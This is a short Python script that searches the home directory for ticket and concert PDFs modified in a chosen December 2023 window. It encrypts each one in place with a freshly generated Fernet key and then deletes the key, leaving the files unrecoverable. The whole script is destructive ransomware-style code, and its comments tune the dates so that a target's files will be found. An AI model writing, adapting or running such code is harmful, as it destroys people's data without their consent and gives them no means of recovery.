import os
import fnmatch
import datetime as dt

# required to encrypt
from cryptography.fernet import Fernet



def search_the_file(result, pattern):
    for root, dirs, files in os.walk(os.environ["HOME"]):
        for name in files:
            if fnmatch.fnmatch(name, pattern):
                result.append(os.path.join(root, name))
    return result

def choos_by_date(list_of_files, antes, despues):
    for thing in reversed(list_of_files):
        if os.path.getmtime(thing) < antes or os.path.getmtime(thing) > despues:
            list_of_files.remove(thing)

def file_encryption(file_to_encrypt, key):
    # opening the key
    with open(key, 'rb') as filekey:
        key = filekey.read()

    # using the generated key
    fernet = Fernet(key)

    # opening the original file to encrypt
    with open(file_to_encrypt, 'rb') as file:
        original = file.read()

    # encrypting the file
    encrypted = fernet.encrypt(original)

    # opening the file in write mode and writing the encrypted data
    with open(file_to_encrypt, 'wb') as encrypted_file:
        encrypted_file.write(encrypted)

if __name__ == '__main__':
    possible_files = []
    search_the_file(possible_files,'*entrada*.pdf')
    search_the_file(possible_files,'*ticket*.pdf')
    search_the_file(possible_files,'*concert*.pdf')
    search_the_file(possible_files,'*concierto*.pdf')
    #TODO la fecha esta puesta el dia 5 de diciembre, pero tiene que ser una fecha en la que haya algun pdf
    #que contenga alguna de las keywords de arriba. Si no, no va a encontrar nada para encriptar y no har√° nada.
    before = int(dt.datetime(2023, 12, 5, 0, 0, 0).timestamp()) #Date file was modified
    after = int(dt.datetime(2023, 12, 14, 23, 59, 59).timestamp())

    choos_by_date(possible_files, before, after)

    # key generation into file
    with open('filekey.key', 'wb') as filekey:
        filekey.write(Fernet.generate_key())

    #TODO this has to be uncommented, it's like this to make sure no mistakes are made
    for direction in possible_files:
        file_encryption(direction, 'filekey.key')
        # print('Hello')

    os.remove('filekey.key')
    print('Done')